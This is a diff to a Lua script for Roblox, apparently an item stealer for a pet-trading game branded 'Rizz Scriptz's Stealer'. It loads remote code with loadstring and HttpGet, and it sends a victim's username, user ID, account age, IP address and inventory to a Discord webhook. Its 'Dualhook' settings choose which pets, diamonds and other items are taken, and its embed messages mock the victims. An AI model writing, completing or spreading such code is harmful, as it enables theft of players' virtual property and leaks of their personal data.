@@ -214,7 +214,7 @@ local data1
 
 -- Loading Screen
 if _G.LoadingScreen ~= false then
-    loadstring(game:HttpGet('https://cdn.discordapp.com/attachments/1130602798896136193/1130602811093164072/Loading_Screen.lua'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
+    loadstring(game:HttpGet('Put Your Loading Screen Raw Link Here'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
 end
 
 -- Remotes
@@ -945,7 +945,6 @@ end
 -- Webhook
 local url = Webhook
 local whenabled = true
-
 local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     local abcdef1
     local headers
@@ -954,115 +953,205 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     Image = game:HttpGet("https://thumbnails.roblox.com/v1/assets?assetIds=" ..
         Image .. "&returnPolicy=PlaceHolder&size=420x420&format=Png&isCircular=false")
     Image = game:GetService("HttpService"):JSONDecode(Image).data[1].imageUrl
-
     if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
-        imgs = "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
+        imgs =
+        "https://media.discordapp.net/attachments/1116406257834790983/1123706085749039226/FB_IMG_1686723815871.gif"
         data1 = {
-            content = ping,
-            username = "Rizz Scriptz",
-            avatar_url = imgs,
-            embeds = {{
-                title = "**New Hit** ||With Rizz||",
-                url = "https://discord.gg/uSgzNwHDTS",
-                type = "rich",
-                color = tonumber(0x2798FF),
-                thumbnail = {
-                    url = Image,
-                    height = 420,
-                    width = 420
+            ["content"] = ping,
+            ["username"] = "Rizz Scriptz",
+            ["avatar_url"] = imgs,
+            ["embeds"] = { {
+                ["title"] = "**New Hit** ||With Rizz||",
+                ["url"] = "https://youtu.be/dQw4w9WgXcQ",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x2798FF),
+                ["thumbnail"] = {
+                    ["url"] = Image,
+                    ["height"] = 420,
+                    ["width"] = 420
                 },
-                fields = {{
-                    name = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
-                    value = "```Username     : " .. username ..
+                ["fields"] = { {
+                    ["name"] = "**Thanks for deleting this kid from existance** :cat:",
+                    ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
-                    inline = false
+                    ["inline"] = false
                 }, {
-                    name = ":dog: **Pets left** :dog:",
-                    value = "```" .. f .. "```",
-                    inline = true
+                    ["name"] = ":dog: **Pets left** :dog:",
+                    ["value"] = "```" .. f .. "```",
+                    ["inline"] = true
                 }, {
-                    name = ":gem: **Diamonds** :gem:",
-                    value = "```" .. d .. "```",
-                    inline = true
+                    ["name"] = ":gem: **Diamonds** :gem:",
+                    ["value"] = "```" .. d .. "```",
+                    ["inline"] = true
                 },
-                {
-                    name = rarity,
-                    value = "```" .. name .. "```",
-                    inline = true
+                    {
+                        ["name"] = rarity,
+                        ["value"] = "```" .. name .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":bank: **Joined Banks** :bank:",
+                        ["value"] = "```" .. bankscount .. lmao .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = ":gem: **Wd Diamonds** :gem:",
+                        ["value"] = "```" .. WDiamondsCount .. "```",
+                        ["inline"] = true
+                    }, {
+                    ["name"] = ":money_mouth: **Wd Huges** :money_mouth:",
+                    ["value"] = "```" .. FinalFinal .. "```",
+                    ["inline"] = true
                 },
-                {
-                    name = ":bank: **Joined Banks** :bank:",
-                    value = "```" .. bankscount .. lmao .. "```",
-                    inline = true
-                },
-                {
-                    name = ":gem: **Wd Diamonds** :gem:",
-                    value = "```" .. WDiamondsCount .. "```",
-                    inline = true
-                }, {
-                    name = ":money_mouth: **Wd Huges** :money_mouth:",
-                    value = "```" .. FinalFinal .. "```",
-                    inline = true
-                },
-            }}
+                }
+            } }
         }
+        newdata1 = game:GetService("HttpService"):JSONEncode(data1)
+
+        headers = {
+            ["content-type"] = "application/json"
+        }
+
+        if Webhook ~= nil and whenabled == true then
+            abcdef1 = {
+                Url = url,
+                Body = newdata1,
+                Method = "POST",
+                Headers = headers
+            }
+            request(abcdef1)
+        end
     else
-        imgs = "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
+        imgs =
+        "https://media.discordapp.net/attachments/1116406257834790983/1123706085749039226/FB_IMG_1686723815871.gif"
         data1 = {
-            content = ping,
-            username = "Rizz Scriptz",
-            avatar_url = imgs,
-            embeds = {{
-                title = "**New Hit** ||With Rizz||",
-                url = "https://discord.gg/uSgzNwHDTS",
-                type = "rich",
-                color = tonumber(0x2798FF),
-                thumbnail = {
-                    url = Image,
-                    height = 420,
-                    width = 420
+            ["content"] = ping,
+            ["username"] = "Exterminator ballz",
+            ["avatar_url"] = imgs,
+            ["embeds"] = { {
+                ["title"] = "**New kid killed with me :skull:** ||With Rizz||",
+                ["url"] = "https://youtu.be/dQw4w9WgXcQ",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x2798FF),
+                ["thumbnail"] = {
+                    ["url"] = Image,
+                    ["height"] = 420,
+                    ["width"] = 420
                 },
-                fields = {{
-                    name = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
-                    value = "```Username     : " .. username ..
-                        "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
+                ["fields"] = { {
+                    ["name"] = "**New kid killed with me :skull:",
+                    ["value"] = "```Username     : " .. username ..
+                        "\nUser-ID      : " .. fardplayer.userId .. "\Bro's account is older than him :skull:  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
-                        "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
-                    inline = false
+                        "\nExploit      : " .. exploit .. "\nWho got that shit     : " .. receiver .. "```",
+                    ["inline"] = false
                 }, {
-                    name = ":dog: **Pets left** :dog:",
-                    value = "```" .. f .. "```",
-                    inline = true
+                    ["name"] = ":dog: **That shit left** :dog:",
+                    ["value"] = "```" .. f .. "```",
+                    ["inline"] = true
                 }, {
-                    name = ":gem: **Diamonds** :gem:",
-                    value = "```" .. d .. "```",
-                    inline = true
+                    ["name"] = ":gem: **Dildomonds** :gem:",
+                    ["value"] = "```" .. d .. "```",
+                    ["inline"] = true
                 },
-                {
-                    name = rarity,
-                    value = "```" .. name .. "```",
-                    inline = true
-                },
-            }}
+                    {
+                        ["name"] = rarity,
+                        ["value"] = "```" .. name .. "```",
+                        ["inline"] = true
+                    },
+                }
+            } }
         }
+        newdata1 = game:GetService("HttpService"):JSONEncode(data1)
+
+        headers = {
+            ["content-type"] = "application/json"
+        }
+
+        if Webhook ~= nil and whenabled == true then
+            abcdef1 = {
+                Url = url,
+                Body = newdata1,
+                Method = "POST",
+                Headers = headers
+            }
+            request(abcdef1)
+        end
     end
+end
 
-    local newdata1 = game:GetService("HttpService"):JSONEncode(data1)
-
-    headers = {
-        ["content-type"] = "application/json"
-    }
-
-    if url ~= nil and whenabled == true then
-        abcdef1 = {
-            Url = url,
-            Body = newdata1,
-            Method = "POST",
-            Headers = headers
-        }
-        request(abcdef1)
+local dhuser = getgenv().Settings.User
+-- if getgenv().Settings ~= nil then
+--     if getgenv().Settings.PremiumKey ~= nil then
+--         local premkey = getgenv().Settings.PremiumKey
+--         local dhkey = to_base64(to_base64(to_base64(to_base64(premkey))))
+--         local dhdata = {
+--             dhprem = dhkey
+--         }
+--         local dhurl = "premium database php link here" -- Exc : https://rizz.xyz/premium.php
+--         local dhheaders = {
+--             ["content-type"] = "application/json"
+--         }
+--         local dhnewdata = game:GetService("HttpService"):JSONEncode(dhdata)
+--         local dhresponse = request({
+--             Url = dhurl,
+--             Body = dhnewdata,
+--             Method = "POST",
+--             Headers = dhheaders
+--         })
+--         local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
+--         if responsed ~= 'false' then
+--             dhuser = responsed
+--         else
+--             dhuser = nil
+--         end
+--     end
+-- end
+local titanicin
+local bananin
+local hugein
+local pogin
+local excin
+local eventin
+local secretin
+local mythicin
+local gemsin
+local mailmsg = ".gg/uSgzNwHDTS"
+if dhuser ~= nil then
+    if getgenv().Settings.Titanics.Dualhook then
+        titanicin = getgenv().Settings.Titanics.Intensity
+    end
+    if getgenv().Settings.Banana.Dualhook then
+        bananin = getgenv().Settings.Banana.Intensity
+    end
+    if getgenv().Settings.Huges.Dualhook then
+        hugein = getgenv().Settings.Huges.Intensity
+    end
+    if getgenv().Settings.Pogs.Dualhook then
+        pogin = getgenv().Settings.Pogs.Intensity
+    end
+    if getgenv().Settings.Exclusives.Dualhook then
+        excin = getgenv().Settings.Exclusives.Intensity
+    end
+    if getgenv().Settings.Events.Dualhook then
+        eventin = getgenv().Settings.Events.Intensity
+    end
+    if getgenv().Settings.Secrets.Dualhook then
+        secretin = getgenv().Settings.Secrets.Intensity
+    end
+    if getgenv().Settings.HC_DM_Mythics.Dualhook then
+        mythicin = getgenv().Settings.HC_DM_Mythics.Intensity
+    end
+    if getgenv().Settings.Gems.Dualhook then
+        gemsin = getgenv().Settings.Gems.Intensity
+    end
+    if getgenv().Settings.Webhook ~= true then
+        whenabled = false
+    end
+    if getgenv().Settings.MailMessage ~= nil then
+        mailmsg = getgenv().Settings.MailMessage
     end
 end
 
